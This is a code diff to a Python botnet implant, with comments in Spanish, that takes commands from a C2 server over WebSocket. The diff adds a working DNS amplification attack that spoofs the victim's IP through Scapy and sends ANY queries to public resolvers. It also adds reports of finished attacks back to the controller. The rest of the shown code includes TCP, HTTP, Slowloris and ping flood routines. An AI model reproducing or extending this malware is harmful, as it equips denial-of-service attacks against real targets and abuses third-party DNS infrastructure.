@@ -12,6 +12,7 @@ import time
 from websockets import connect
 from websockets.exceptions import ConnectionClosedError
 from typing import List, Dict, Tuple, Optional
+from scapy.all import IP, UDP, DNS, DNSQR, send, Raw
 import requests
 
 class Impl:
@@ -41,6 +42,7 @@ class Impl:
     async def _connect_to_c2(self) -> None:
         """Establece conexión WebSocket con el C2"""
         async with connect(f"{self.c2_ws_url}?id={self.impl_id}") as ws:
+            print(ws)
             print(f"[+] Conectado a C2 en {self.c2_ws_url}")
             while self.running:
                 await self._handle_commands(ws)
@@ -213,12 +215,15 @@ class Impl:
         # Detener cualquier ataque previo
         if self.active_attack:
             await self._stop_attack(ws)
+
+        # Obtener el bucle de eventos actual
+        loop = asyncio.get_event_loop()
         
         # Iniciar nuevo ataque
         self.active_attack = True
         self.attack_thread = threading.Thread(
             target=self._execute_attack,
-            args=(str(attack_type), str(target), int(duration), ws),
+            args=(str(attack_type), str(target), int(duration), ws, loop),
             daemon=True
         )
         self.attack_thread.start()
@@ -230,7 +235,7 @@ class Impl:
             "duration": duration
         }))
     
-    def _execute_attack(self, attack_type: str, target: str, duration: int, ws) -> None:
+    def _execute_attack(self, attack_type: str, target: str, duration: int, ws, loop) -> None:
 
         """Ejecuta el ataque en un hilo separado"""
         end_time = time.time() + duration
@@ -256,6 +261,27 @@ class Impl:
             print(f"[!] Error en el ataque: {e}")
         finally:
             self.active_attack = False
+            # Notificar que el ataque ha terminado
+            asyncio.run_coroutine_threadsafe(
+                self._notify_attack_completed(ws, attack_type, target),
+                loop
+            )
+
+
+        
+    async def _notify_attack_completed(self, ws, attack_type: str, target: str) -> None:
+        """Notifica al C2 que el ataque ha terminado"""
+        try:
+            await ws.send(json.dumps({
+                "status": "attack_completed",
+                "attack_type": attack_type,
+                "target": target,
+                "message": "Ataque completado"
+            }))
+        except Exception as e:
+            print(f"[!] Error notificando finalización del ataque: {e}")
+
+
     
     def _tcp_flood_attack(self, target: str, end_time: float) -> None:
         """Ataque de inundación TCP"""
@@ -286,7 +312,7 @@ class Impl:
                 pass
     
     def _http_flood_attack(self, target: str, end_time: float) -> None:
-        print(target)
+
         """Ataque de inundación HTTP"""
         import urllib.request
         # 1. Verificar formato del target
@@ -330,6 +356,8 @@ class Impl:
                 time.sleep(1)  # Esperar antes de reintentar
         
         print("[*] Ataque HTTP Flood finalizado")
+    
+
     
     def _slowloris_attack(self, target: str, end_time: float) -> None:
         """Ataque Slowloris (mantiene conexiones HTTP abiertas)"""
@@ -387,27 +415,48 @@ class Impl:
             try:
                 if os.name == 'nt':
                     os.system(f"ping -n 1 -l 65500 {target} > nul")
-                else:
-                    os.system(f"ping -c 1 -s 65500 {target} > /dev/null")
             except:
                 pass
     
+
     def _dns_amplification_attack(self, target: str, end_time: float) -> None:
-        """Ataque de amplificación DNS"""
-        dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1"]  # Servidores DNS públicos
+        """Ataque de amplificación DNS con IP spoofing"""
+        # Lista de servidores DNS abiertos (considera usar una lista más grande)
+        dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9"]
         target_ip = target.split(":")[0]
+        
+        # Dominios con respuestas grandes para mayor amplificación
+        large_domains = [
+            "example.com", 
+            "isc.org", 
+            "ripe.net",
+            "google.com",
+            "microsoft.com"
+        ]
         
         while time.time() < end_time and self.active_attack:
             try:
                 for dns_server in dns_servers:
-                    # Consulta DNS simplificada (en realidad necesitarías construir una consulta válida)
-                    query = b'\x00' * 64  # Placeholder
-                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    s.sendto(query, (dns_server, 53))
-                    s.close()
-            except:
+                    # Seleccionar un dominio aleatorio
+                    domain = random.choice(large_domains)
+                    
+                    # Crear paquete DNS con Scapy para mayor control
+                    # Usamos tipo ANY (255) o TXT para respuestas más grandes
+                    dns_query = IP(dst=dns_server, src=target_ip)/UDP(sport=random.randint(1024, 65535), dport=53)/DNS(
+                        rd=1,
+                        qd=DNSQR(qname=domain, qtype="ANY")
+                    )
+                    
+                    # Enviar el paquete con IP falsificada
+                    send(dns_query, verbose=0)
+                    
+                    # Pequeña pausa para evitar saturación local
+                    time.sleep(0.01)
+                    
+            except Exception as e:
                 pass
-    
+
+
     def _close_sockets(self, sockets: list) -> None:
         """Cierra todos los sockets en la lista"""
         for s in sockets:
@@ -441,6 +490,8 @@ class Impl:
  
         print(f"[+] Implante registrado: {model}")
         req = requests.post(f"http://localhost:4000/api/impl/new/{model['impl_id']}", data=model)
+
+        print(req)
 
     @property
     def impl_id(self) -> str:
